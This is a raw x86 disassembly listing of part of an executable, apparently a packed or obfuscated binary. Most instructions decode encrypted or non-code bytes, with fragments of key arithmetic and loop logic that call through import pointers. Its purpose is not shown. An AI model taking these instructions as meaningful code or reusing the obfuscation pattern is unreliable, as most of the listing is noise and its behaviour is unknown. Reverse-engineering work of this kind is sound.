  40da07:	loope  0x40d9c2
  40da09:	jmp    0x55706734
  40da0e:	popa   
  40da0f:	rol    DWORD PTR [eax],0xfb
  40da12:	or     ecx,esp
  40da14:	dec    ecx
  40da15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da16:	and    al,0x18
  40da18:	mov    ebx,0x84c3ba1
  40da1d:	jg     0x40da62
  40da1f:	jmp    0x3446:0x44b5fc85
  40da26:	cmp    bh,BYTE PTR [esi+0x34]
  40da29:	mov    esi,0xb9ad0c71
  40da2e:	xchg   ebp,eax
  40da2f:	pop    ds
  40da30:	mov    bl,0xba
  40da32:	test   al,bl
  40da34:	stc    
  40da35:	mov    bl,0x54
  40da37:	lods   eax,DWORD PTR ds:[esi]
  40da38:	mov    WORD PTR [ebx-0x2],gs
  40da3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da3c:	xchg   ebp,eax
  40da3d:	(bad)  
  40da3e:	mov    eax,ds:0x588be14e
  40da43:	mov    edx,0x384ea502
  40da48:	sbb    cl,BYTE PTR [edi-0x59dab270]
  40da4e:	imul   ecx,eax,0xd67c46d1
  40da54:	cmp    BYTE PTR [ecx+0x764bc89],bh
  40da5a:	sti    
  40da5b:	sar    ah,0x31
  40da5e:	xchg   ecx,eax
  40da5f:	push   eax
  40da60:	shl    BYTE PTR [ecx+0x50],1
  40da63:	call   0xe9873666
  40da68:	sbb    cl,BYTE PTR [ecx]
  40da6a:	cli    
  40da6b:	and    edi,ebp
  40da6d:	jp     0x40da3e
  40da6f:	rcr    BYTE PTR [ecx-0x6d],1
  40da72:	lods   al,BYTE PTR ds:[esi]
  40da73:	jo     0x40da11
  40da75:	ror    DWORD PTR [ebp-0x3b85fbc],0xe0
  40da7c:	ret    
  40da7d:	or     eax,0x56d09648
  40da82:	lods   al,BYTE PTR ds:[esi]
  40da83:	popf   
  40da84:	xchg   BYTE PTR [ebp-0x70],al
  40da87:	shr    BYTE PTR [ebx-0x65cf2af8],cl
  40da8d:	jae    0x40da8e
  40da8f:	retf   
  40da90:	sahf   
  40da91:	mov    al,0xb0
  40da93:	or     cl,BYTE PTR [esi]
  40da95:	mov    ?,WORD PTR [ebx+0x7e35e0f9]
  40da9b:	nop
  40da9c:	inc    esi
  40da9d:	cmp    ebx,eax
  40da9f:	dec    esi
  40daa0:	pop    ss
  40daa1:	out    0x3e,eax
  40daa3:	pop    eax
  40daa4:	fs pop esi
  40daa6:	mov    eax,0xd60d6930
  40daab:	inc    ebx
  40daac:	test   al,0xa4
  40daae:	push   edi
  40daaf:	ins    DWORD PTR es:[edi],dx
  40dab0:	pop    es
  40dab1:	inc    edx
  40dab2:	sti    
  40dab3:	je     0x40da55
  40dab5:	mov    dh,0x26
  40dab7:	jnp    0x40db34
  40dab9:	xchg   edi,eax
  40daba:	test   BYTE PTR [eax+0x60],ah
  40dabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dabe:	aam    0x63
  40dac0:	(bad)  
  40dac1:	mov    eax,0x4b9f1d65
  40dac6:	inc    esp
  40dac7:	mov    bh,0xcc
  40dac9:	repz or bl,BYTE PTR [esp+ecx*2+0x673fed3c]
  40dad1:	push   ecx
  40dad2:	hlt    
  40dad3:	mov    ecx,?
  40dad5:	addr16 lock adc edi,edi
  40dad9:	sub    DWORD PTR [eax],esi
  40dadb:	cmp    DWORD PTR cs:[ecx],esp
  40dade:	sbb    eax,0xd29dc895
  40dae3:	aaa    
  40dae4:	pop    ss
  40dae5:	pop    edx
  40dae6:	xchg   ebx,eax
  40dae7:	sub    ebx,esi
  40dae9:	jg     0x40db3f
  40daeb:	call   0xe963:0xd4aef556
  40daf2:	es jb  0x40da87
  40daf5:	sub    eax,0xadaa8f88
  40dafa:	nop
  40dafb:	scas   al,BYTE PTR es:[edi]
  40dafc:	push   ecx
  40dafd:	and    ch,BYTE PTR [ecx-0x791072ac]
  40db03:	sbb    al,0xc
  40db05:	dec    ebp
  40db06:	and    al,0x13
  40db08:	mov    bh,BYTE PTR [ebx+0x1f0fcff5]
  40db0e:	sbb    bh,cl
  40db10:	adc    al,BYTE PTR [ebx+0x576b4806]
  40db16:	xor    al,0x7b
  40db18:	movaps xmm3,xmm0
  40db1b:	cmp    eax,0x23a0dcbb
  40db20:	and    eax,0xdada6310
  40db25:	push   ebx
  40db26:	xlat   BYTE PTR ds:[ebx]
  40db27:	mov    edi,0x541e4d9e
  40db2c:	xchg   ecx,eax
  40db2d:	in     eax,dx
  40db2e:	outs   dx,BYTE PTR ds:[esi]
  40db2f:	pop    ebp
  40db30:	out    0x7a,al
  40db32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db33:	dec    esi
  40db34:	in     al,dx
  40db35:	jb     0x40db6f
  40db37:	jl     0x40db65
  40db39:	dec    ebp
  40db3a:	jb     0x40dba2
  40db3c:	ds adc ch,0x45
  40db40:	cmp    DWORD PTR [ebx-0x27],edx
  40db43:	cdq    
  40db44:	pop    ss
  40db45:	int    0x1
  40db47:	adc    dh,BYTE PTR [edx+0x6e06cb27]
  40db4d:	dec    esi
  40db4e:	add    DWORD PTR [ecx],ecx
  40db50:	mov    esi,0x840bde80
  40db55:	sub    ah,BYTE PTR [eax]
  40db57:	mov    ah,0xc0
  40db59:	ds sub al,0xbd
  40db5c:	je     0x40db82
  40db5e:	jb     0x40dbb2
  40db60:	inc    edx
  40db61:	ja     0x40db57
  40db63:	xchg   BYTE PTR [ebx-0x7a],cl
  40db66:	jmp    0x6e7d17cb
  40db6b:	mov    eax,ds:0x41fded64
  40db70:	dec    edx
  40db71:	or     eax,0x978ad28d
  40db76:	mov    esi,0x495fe4a
  40db7b:	or     ebp,ebp
  40db7d:	daa    
  40db7e:	jecxz  0x40db7b
  40db80:	imul   ebx,DWORD PTR [eax],0x76
  40db83:	sbb    eax,0x59903caa
  40db88:	arpl   WORD PTR [ebp-0x173cae47],ax
  40db8e:	inc    edi
  40db8f:	cmp    eax,0x6f76c37c
  40db94:	out    0xd5,al
  40db96:	(bad)  
  40db98:	mov    edi,0x179f7be
  40db9d:	push   ebx
  40db9e:	in     al,dx
  40db9f:	dec    esi
  40dba0:	int    0x76
  40dba2:	mov    eax,ds:0xbf252d43
  40dba7:	sbb    BYTE PTR [eax-0x70],ch
  40dbaa:	(bad)  
  40dbab:	rcr    edi,cl
  40dbad:	out    0x38,al
  40dbaf:	fwait
  40dbb0:	push   ss
  40dbb1:	cmp    DWORD PTR [eax-0x72],0xffffffb7
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x79bfeba4],0xfa0f7670
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc54
  40dbe0:	pop    ds
  40dbe1:	or     esp,DWORD PTR [edx]
  40dbe3:	inc    esi
  40dbe4:	xchg   ebp,eax
  40dbe5:	or     DWORD PTR [eax],ebx
  40dbe7:	cld    
  40dbe8:	push   edx
  40dbea:	dec    eax
  40dbeb:	push   esp
  40dbec:	mov    esi,0xceec7450
  40dbf1:	pushf  
  40dbf2:	ins    DWORD PTR es:[edi],dx
  40dbf3:	mov    al,ds:0x268c4171
  40dbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf9:	dec    esp
  40dbfa:	mov    esi,0xbe8536b3
  40dbff:	mov    edx,0xccc253e2
  40dc04:	xchg   ebx,eax
  40dc05:	add    ah,dh
  40dc07:	mov    ds:0x19890086,al
  40dc0c:	sbb    esi,DWORD PTR [edi+esi*1]
  40dc0f:	out    0x4e,al
  40dc11:	add    esi,esp
  40dc13:	dec    eax
  40dc14:	inc    esp
  40dc15:	int3   
  40dc16:	loopne 0x40dbb4
  40dc18:	sbb    edi,0xd6a83e00
  40dc1e:	cwde   
  40dc1f:	pop    ss
  40dc20:	mov    BYTE PTR [edx],bh
  40dc22:	and    DWORD PTR [edi],eax
  40dc24:	(bad)  
  40dc26:	repnz mov al,ds:0xde2ea86b
  40dc2c:	daa    
  40dc2d:	inc    edi
  40dc2e:	adc    cl,cl
  40dc30:	jg     0x40dbf1
  40dc32:	push   0xffffffa4
  40dc34:	(bad)  
  40dc35:	repz mov eax,ds:0x6ff551a3
  40dc3b:	test   al,0x53
  40dc3d:	shl    BYTE PTR ds:0xd8d87bd0,cl
  40dc43:	jmp    0x98f4168a
  40dc48:	lahf   
  40dc49:	sub    al,0x8f
  40dc4b:	inc    eax
  40dc4c:	fmul   st(5),st
  40dc4e:	inc    edx
  40dc4f:	add    eax,DWORD PTR [eax]
  40dc51:	push   eax
  40dc52:	mov    esi,0x82d977a
  40dc57:	fisubr WORD PTR [eax]
  40dc59:	or     eax,0xbd9b7f3f
  40dc5e:	pop    ds
  40dc5f:	mov    BYTE PTR [edi+0x72],ah
  40dc62:	xor    BYTE PTR [esi+esi*8],cl
  40dc65:	(bad)  
  40dc66:	push   ebx
  40dc67:	(bad)  
  40dc69:	push   es
  40dc6a:	or     eax,0xc7de031b
  40dc6f:	call   0x8c0a:0xcd663065
  40dc76:	imul   ecx,DWORD PTR [esi-0x37602e43],0xffffffdf
  40dc7d:	push   ss
  40dc7e:	push   ecx
  40dc7f:	pop    ds
  40dc80:	in     eax,dx
  40dc81:	fistp  DWORD PTR [ecx+edx*1-0x19]
  40dc85:	and    ebx,DWORD PTR [eax]
  40dc87:	lea    edx,[ecx-0x626e11e8]
  40dc8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc8e:	mov    edx,0xd9e397e8
  40dc93:	inc    esi
  40dc94:	mov    cl,0x69
  40dc96:	psubusw mm0,mm1
  40dc99:	mov    eax,ds:0x6f5849ac
  40dc9e:	and    eax,0xdff0980c
  40dca3:	pop    edx
  40dca4:	xchg   edi,eax
  40dca5:	inc    esp
  40dca6:	imul   ecx,DWORD PTR [ebp+0x3681e0f7],0xffffffbd
  40dcad:	ss jmp 0x4aac:0xf4212a5
  40dcb5:	bound  eax,QWORD PTR [edi-0x1d]
  40dcb8:	xchg   ebx,eax
  40dcb9:	int3   
  40dcba:	js     0x40dc8c
  40dcbc:	les    ebx,FWORD PTR [ecx-0x1e]
  40dcbf:	and    edi,ecx
  40dcc1:	call   0xd382d88f
  40dcc6:	adc    ebx,DWORD PTR [ebx+eiz*1+0x6f]
  40dcca:	aas    
  40dccb:	pop    es
  40dccc:	xor    DWORD PTR [ecx+0x7d],edi
  40dccf:	push   esp
  40dcd0:	xchg   bl,al
  40dcd2:	pop    esi
  40dcd3:	push   ss
  40dcd4:	dec    edi
  40dcd5:	ja     0x40dcab
  40dcd7:	adc    DWORD PTR [eax-0x3b],esi
  40dcda:	sbb    esp,DWORD PTR [eax+0x4a]
  40dcdd:	inc    esp
  40dcde:	popf   
  40dcdf:	cs mov eax,0x5ea606c
  40dce5:	js     0x40dcf3
  40dce7:	mov    ch,0xa1
  40dce9:	jecxz  0x40dd36
  40dceb:	retf   0x7402
  40dcee:	jmp    0x20c63f1
  40dcf3:	mov    bl,BYTE PTR [edx-0x11057741]
  40dcf9:	xor    al,0x6e
  40dcfb:	or     DWORD PTR [edi-0x45f8631c],ebp
  40dd01:	sub    ch,BYTE PTR [esp+ecx*1-0x7c]
  40dd05:	pop    ecx
  40dd06:	nop
  40dd07:	mov    esi,0xc5cbb3aa
  40dd0c:	int3   
  40dd0d:	rol    cl,0xb7
  40dd10:	lods   al,BYTE PTR ds:[esi]
  40dd11:	push   es
  40dd12:	test   eax,0x6909962b
  40dd17:	or     BYTE PTR cs:[ebx],dh
  40dd1a:	lds    ebx,FWORD PTR [eax+eiz*4+0x6d]
  40dd1e:	test   eax,0x5bdf0c66
  40dd23:	nop
  40dd24:	pushf  
  40dd25:	sbb    eax,0x26f2e72f
  40dd2a:	sub    eax,0xfb9b470
  40dd2f:	xor    bl,dl
  40dd31:	xchg   ebx,eax
  40dd32:	pusha  
  40dd33:	lods   al,BYTE PTR ds:[esi]
  40dd34:	(bad)  
  40dd35:	push   0xe86e086c
  40dd3a:	in     eax,0xa2
  40dd3c:	jno    0x40ddb5
  40dd3e:	push   eax
  40dd3f:	pop    eax
  40dd40:	mov    bl,dh
  40dd42:	bound  ecx,QWORD PTR [ecx]
  40dd44:	icebp  
  40dd45:	shl    DWORD PTR [eax-0xc],1
  40dd48:	out    dx,eax
  40dd49:	clc    
  40dd4a:	ret    
  40dd4b:	sub    DWORD PTR [eax+edi*4-0x798219e1],esp
  40dd52:	xchg   bp,ax
  40dd54:	mov    ebx,0x21654fd6
  40dd59:	bound  edx,QWORD PTR [ebp+0x25f70be0]
  40dd5f:	xor    ah,al
  40dd61:	mov    dl,0x69
  40dd63:	xchg   esp,eax
  40dd64:	fisttp DWORD PTR [eax]
  40dd66:	and    ah,BYTE PTR [ecx]
  40dd68:	jge    0x40ddde
  40dd6a:	jns    0x40ddac
  40dd6c:	pop    ds
  40dd6d:	pop    ds
  40dd6e:	daa    
  40dd6f:	lock js 0x40dd8f
  40dd72:	lea    esp,[ecx+0x350f26a5]
  40dd78:	popa   
  40dd79:	pop    edx
  40dd7a:	sbb    al,0xc6
  40dd7c:	shl    edi,1
  40dd7e:	mov    edx,0xf06749c9
  40dd83:	jbe    0x40dd80
  40dd85:	cwde   
  40dd86:	xor    al,0xb2
  40dd88:	xor    DWORD PTR [edi+edx*1+0x3d],esp
  40dd8c:	xor    al,0x34
  40dd8e:	inc    edi
  40dd8f:	loop   0x40dd36
  40dd91:	mov    al,ds:0x6b449d20
  40dd96:	adc    BYTE PTR [esi+0x3f],ch
  40dd99:	inc    esi
  40dd9a:	xchg   BYTE PTR [esi+ecx*1-0x7a],al
  40dd9e:	ror    bl,cl
  40dda0:	pop    ss
  40dda1:	(bad)  
  40dda2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda3:	mov    ebp,0x616b0bbb
  40dda8:	add    dl,dl
  40ddaa:	or     dh,BYTE PTR [edx-0xa]
  40ddad:	retf   
  40ddae:	cmp    al,0x54
  40ddb0:	sar    dl,1
  40ddb2:	enter  0x8f08,0xa7
  40ddb6:	fst    QWORD PTR [esi-0x2c2a2c98]
  40ddbc:	xlat   BYTE PTR ds:[ebx]
  40ddbd:	cmp    eax,0x3991b6f0
  40ddc2:	xchg   BYTE PTR [eax+0x6d],bh
  40ddc5:	xor    esi,DWORD PTR [esi-0x29439634]
  40ddcb:	popf   
  40ddcc:	outs   dx,DWORD PTR ds:[esi]
  40ddcd:	mov    esp,0xe55f4ee0
  40ddd2:	ret    0x7bc3
  40ddd5:	and    BYTE PTR [ecx],dl
  40ddd7:	ds (bad) 
  40ddd9:	outs   dx,DWORD PTR ds:[esi]
  40ddda:	push   ebx
  40dddb:	or     cl,0x9d
  40ddde:	stos   BYTE PTR es:[edi],al
  40dddf:	dec    edx
  40dde0:	in     al,dx
  40dde1:	test   edx,0x81c62520
  40dde7:	xchg   esp,eax
  40dde8:	daa    
  40dde9:	cdq    
  40ddea:	shl    BYTE PTR [edx+0x2bbb12ba],1
  40ddf0:	cwde   
  40ddf1:	add    BYTE PTR [edi+0x699a0bd3],dh
  40ddf7:	jle    0x40de14
  40ddf9:	cdq    
  40ddfa:	push   ebx
  40ddfb:	mov    bh,0x8c
  40ddfd:	jne    0x40ddee
  40ddff:	dec    esp
  40de00:	xor    al,0xbe
  40de02:	or     DWORD PTR [eax],edi
  40de04:	and    eax,0xabe89518
  40de09:	nop
  40de0a:	into   
  40de0b:	adc    DWORD PTR [ebx-0x1a],ebx
  40de0e:	cmp    BYTE PTR [ebp-0x2b],bl
  40de11:	adc    al,0x2a
  40de13:	pop    ss
  40de14:	mov    ds:0x37c0324b,al
  40de19:	xchg   esi,eax
  40de1a:	push   ebx
  40de1b:	shl    BYTE PTR [ecx],1
  40de1d:	jnp    0x40de48
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	neg    DWORD PTR [ebp+0xf]
  40dea8:	imul   edx,DWORD PTR [edx+edi*4-0x64],0x7e
  40dead:	jle    0x40dec1
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de76
  40deb3:	retf   0xa67a
  40deb6:	mov    dh,0x2d
  40deb8:	add    cl,bl
  40deba:	push   ebp
  40debb:	jmp    0x1cde3be6
  40dec0:	fnstenv [esi+ecx*2+0x2d]
  40dec4:	adc    al,0x34
  40dec6:	loop   0x40df2e
  40dec8:	icebp  
  40dec9:	xchg   ecx,eax
  40deca:	xor    al,0x5e
  40decc:	mov    ebx,0x6a822096
  40ded1:	out    0xf4,al
  40ded3:	(bad)  [esi+0x11]
  40ded6:	lds    ebx,FWORD PTR [esi+0x27]
  40ded9:	test   bh,bh
  40dedb:	enter  0x88b0,0x74
  40dedf:	lods   eax,DWORD PTR ds:[esi]
  40dee0:	retf   
  40dee1:	mov    dh,0xcc
  40dee3:	scas   al,BYTE PTR es:[edi]
  40dee4:	imul   esi,DWORD PTR [edi],0x8afc76c8
  40deea:	je     0x40de8f
  40deec:	aaa    
  40deed:	mov    esp,0x6bccf6de
  40def2:	push   edx
  40def3:	retf   0xd6a9
  40def6:	aaa    
  40def7:	mov    dl,0xc9
  40def9:	loope  0x40ded6
  40defb:	mov    cl,0x51
  40defd:	push   0x2b6e95eb
  40df02:	data16 cmc 
  40df04:	imul   edi,DWORD PTR [edi+0x7a421044],0xffffff8a
  40df0b:	jg     0x40dedd
  40df0d:	inc    ebx
  40df0e:	sbb    DWORD PTR [edi],edi
  40df10:	jae    0x40def2
  40df12:	push   ebx
  40df13:	lods   al,BYTE PTR ds:[esi]
  40df14:	add    eax,0xbd035d49
  40df19:	push   0xffffff86
  40df1b:	arpl   WORD PTR [edx],bp
  40df1d:	pusha  
  40df1e:	cld    
  40df1f:	call   0x9417a3c5
  40df24:	pop    edx
  40df25:	pop    ecx
  40df26:	jg     0x40df66
  40df28:	retf   
  40df29:	daa    
  40df2a:	fmul   st,st(4)
  40df2c:	sbb    BYTE PTR [edx+0x6f],bl
  40df2f:	nop
  40df30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df31:	push   cs
  40df32:	jge    0x40df88
  40df34:	mov    cr4,esi
  40df37:	fsub   QWORD PTR [ecx]
  40df3a:	or     bl,BYTE PTR [eax]
  40df3c:	or     ah,cl
  40df3e:	sahf   
  40df3f:	sbb    DWORD PTR [ebx],esp
  40df41:	mov    ds:0xc87fca0e,eax
  40df46:	addr16 retf 
  40df48:	dec    ebx
  40df49:	inc    edi
  40df4a:	add    eax,0xb6050edb
  40df4f:	jb     0x40dfbe
  40df51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df52:	mov    ebp,cs
  40df54:	data16 test BYTE PTR [esp+ebx*4+0x51c91ed2],ah
  40df5c:	push   0x32b58ca
  40df61:	adc    DWORD PTR [ebx+0x7c],esi
  40df64:	mov    cs,eax
  40df66:	into   
  40df67:	sti    
  40df68:	neg    BYTE PTR [edx-0x1e95fb86]
  40df6e:	mov    al,0xa7
  40df70:	and    bh,BYTE PTR [edx+0x72]
  40df73:	and    al,ch
  40df75:	ja     0x40df56
  40df77:	in     al,dx
  40df78:	mov    cl,0x65
  40df7a:	addr16 mov dl,0x9b
  40df7d:	push   0x43
  40df7f:	imul   eax,DWORD PTR [edi+edi*8-0x68],0x76b55960
  40df87:	jmp    0xb121784f
  40df8c:	add    al,0xa6
  40df8e:	mov    esp,0x4e1dbbba
  40df93:	dec    ebp
  40df94:	popf   
  40df95:	jge    0x40df9f
  40df97:	aas    
  40df98:	shl    BYTE PTR [ecx+0x4b6b294d],1
  40df9e:	fisub  WORD PTR [edi]
  40dfa0:	mov    ebp,0x30dd6872
  40dfa5:	mov    eax,0x45e4e3d6
  40dfaa:	xor    DWORD PTR [edx],esi
  40dfac:	inc    ebx
  40dfad:	mov    esp,eax
  40dfaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfb0:	pushf  
  40dfb1:	inc    edi
  40dfb2:	ror    eax,cl
  40dfb4:	cmc    
  40dfb5:	push   ebp
  40dfb6:	pushf  
  40dfb7:	lods   eax,DWORD PTR ds:[esi]
  40dfb8:	mov    cs:0xf2693ec9,al
  40dfbe:	rcr    DWORD PTR [eax],cl
  40dfc0:	clc    
  40dfc1:	dec    ebx
  40dfc2:	fsubr  st(2),st
  40dfc4:	loopne 0x40df4c
  40dfc6:	sbb    bl,BYTE PTR [ecx-0x46]
  40dfc9:	sub    dl,BYTE PTR [ebp+0x72]
  40dfcc:	retf   
  40dfcd:	out    dx,eax
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433817,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	and    DWORD PTR [ebx+ebp*8+0x77],ebp
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e00f
  40e010:	jb     0x40e016
  40e012:	dec    ebp
  40e013:	sub    DWORD PTR [eax],esp
  40e015:	inc    ecx
  40e016:	outs   dx,DWORD PTR ds:[esi]
  40e017:	gs popa 
  40e019:	jg     0x40dff1
  40e01b:	stos   BYTE PTR es:[edi],al
  40e01c:	cmp    ch,ch
  40e01e:	imul   ebx,esi,0x2b
  40e021:	enter  0x20e,0x5d
  40e025:	cdq    
  40e026:	fstp   TBYTE PTR [edi-0x7c]
  40e029:	jmp    0xd728981d
  40e02e:	pushf  
  40e02f:	or     al,0x33
  40e031:	(bad)  
  40e032:	imul   BYTE PTR [ebx+0xf03f6a0]
  40e038:	test   al,0xa0
  40e03a:	push   ds
  40e03b:	sub    BYTE PTR [ecx+0x364be05a],dl
  40e041:	dec    ebx
  40e042:	mov    WORD PTR [ebx],ds
  40e044:	scas   eax,DWORD PTR es:[edi]
  40e045:	aam    0xde
  40e047:	ja     0x40e020
  40e049:	adc    ah,BYTE PTR [ecx+edx*1+0x4461ad4c]
  40e050:	mov    ecx,0x4bd0b262
  40e055:	loope  0x40e03f
  40e057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e058:	xchg   DWORD PTR [edx-0x79],eax
  40e05b:	dec    edx
  40e05c:	inc    ebx
  40e05d:	xchg   edi,eax
  40e05e:	dec    edi
  40e05f:	jb     0x40e016
  40e061:	push   ebx
  40e062:	push   ebx
  40e063:	or     DWORD PTR [edx+eax*4+0x37],0x6413fb64
  40e06b:	pop    edi
  40e06c:	cmp    eax,0x137bbdeb
  40e071:	jns    0x40e024
  40e073:	ins    BYTE PTR es:[edi],dx
  40e074:	cld    
  40e075:	out    0x9c,al
  40e077:	xchg   ebx,eax
  40e078:	in     al,0x59
  40e07a:	lods   eax,DWORD PTR ds:[esi]
  40e07b:	add    eax,0x8804b77d
  40e080:	stos   BYTE PTR es:[edi],al
  40e081:	iret   
  40e082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e083:	fwait
  40e084:	jge    0x40e06b
  40e086:	adc    BYTE PTR [eax],cl
  40e088:	sbb    esi,DWORD PTR [edx]
  40e08a:	add    BYTE PTR [edi-0x3a3ab97b],al
  40e090:	(bad)  
  40e091:	aad    0xe7
  40e093:	aaa    
  40e094:	shr    ebp,0xe2
  40e097:	sahf   
  40e098:	jno    0x40e0f5
  40e09a:	(bad)  
  40e09b:	int    0x66
  40e09d:	stc    
  40e09e:	sbb    al,0x63
  40e0a0:	or     BYTE PTR [ecx+esi*2-0x5b],dh
  40e0a4:	cld    
  40e0a5:	and    DWORD PTR [edx+0x65],edi
  40e0a8:	cmp    eax,DWORD PTR [eax]
  40e0aa:	adc    al,0xca
  40e0ac:	sub    eax,0x5b50769f
  40e0b1:	sbb    ah,BYTE PTR [edx+0x2bb0271d]
  40e0b7:	je     0x40e0a3
  40e0b9:	ffree  st(1)
  40e0bb:	mov    bl,0x59
  40e0bd:	lds    edx,FWORD PTR [ecx]
  40e0bf:	popaw  
  40e0c1:	inc    esp
  40e0c2:	or     dl,ch
  40e0c4:	and    eax,0x7fabae58
  40e0c9:	and    eax,0xdb317406
  40e0ce:	rol    DWORD PTR [esi+0x63],cl
  40e0d1:	jmp    0x40e069
  40e0d3:	jmp    0x40e133
  40e0d5:	add    edi,0xdeb43a37
  40e0db:	sub    BYTE PTR [ecx],bh
  40e0dd:	jae    0x40e105
  40e0df:	dec    edi
  40e0e0:	jge    0x40e07f
  40e0e2:	pop    ebx
  40e0e3:	ret    0x8fb8
  40e0e6:	or     ebx,esp
  40e0e8:	mov    al,ds:0x97bead07
  40e0ed:	mov    ds:0x48668226,al
  40e0f2:	(bad)  
  40e0f3:	jo     0x40e0b1
  40e0f5:	mov    dl,0xa0
  40e0f7:	push   ebx
  40e0f8:	jecxz  0x40e142
  40e0fa:	push   esi
  40e0fb:	ins    BYTE PTR es:[edi],dx
  40e0fc:	frstor [esi]
  40e0fe:	inc    edi
  40e0ff:	mov    edx,0xa0bc2074
  40e104:	repz and ecx,DWORD PTR [ecx+0xf]
  40e108:	inc    eax
  40e109:	out    0xa1,al
  40e10b:	sbb    dh,BYTE PTR [esi-0xb]
  40e10e:	adc    al,0x60
  40e110:	into   
  40e111:	xchg   DWORD PTR [esi+edi*1+0x6d294d0],eax
  40e118:	xchg   ecx,eax
  40e119:	bound  esp,QWORD PTR [edi+0x869368]
  40e11f:	jl     0x40e0f2
  40e121:	shl    BYTE PTR [edx+0x50311718],cl
  40e127:	push   ss
  40e128:	mov    esp,0xc633eb50
  40e12d:	adc    DWORD PTR ds:0x433823,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	xor    esi,DWORD PTR [bp+0x72b2]
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	hlt    
  40e167:	pop    esi
  40e168:	jno    0x40e16b
  40e16a:	in     al,dx
  40e16b:	rcr    BYTE PTR [ebx-0x34],1
  40e16e:	das    
  40e16f:	clc    
  40e170:	icebp  
  40e171:	(bad)  
  40e172:	push   cs
  40e173:	shl    BYTE PTR [eax+0x6ee72269],cl
  40e179:	push   ebp
  40e17a:	or     al,0x7d
  40e17c:	bound  edx,QWORD PTR [ecx+0x2c1b5f22]
  40e182:	loopne 0x40e1db
  40e184:	rep ins DWORD PTR es:[edi],dx
  40e186:	push   eax
  40e187:	xchg   BYTE PTR [ecx-0x4a6be698],ah
  40e18d:	mov    bl,0xf1
  40e18f:	cs mov dh,0x36
  40e192:	addr16 xchg edx,eax
  40e194:	fiadd  DWORD PTR [eax+0x23e90a3c]
  40e19a:	push   cs
  40e19b:	mov    al,0x9a
  40e19d:	dec    edx
  40e19e:	jmp    0xdcc0:0x8dae8cf6
  40e1a5:	xchg   edx,eax
  40e1a6:	mov    gs,WORD PTR [edx+esi*4+0x1a]
  40e1aa:	jg     0x40e1e0
  40e1ac:	jo     0x40e19c
  40e1ae:	pop    esp
  40e1af:	xor    edx,ecx
  40e1b1:	jns    0x40e1c1
  40e1b3:	into   
  40e1b4:	cs pop esp
  40e1b6:	pop    esp
  40e1b7:	imul   eax,DWORD PTR [edi-0x7f],0xdde21b2e
  40e1be:	push   esi
  40e1bf:	cmp    esi,ecx
  40e1c1:	adc    eax,0x1d3ce16d
  40e1c6:	xchg   edx,eax
  40e1c7:	add    ebx,esp
  40e1c9:	push   cs
  40e1ca:	mov    ebx,eax
  40e1cc:	xchg   ebp,eax
  40e1cd:	popa   
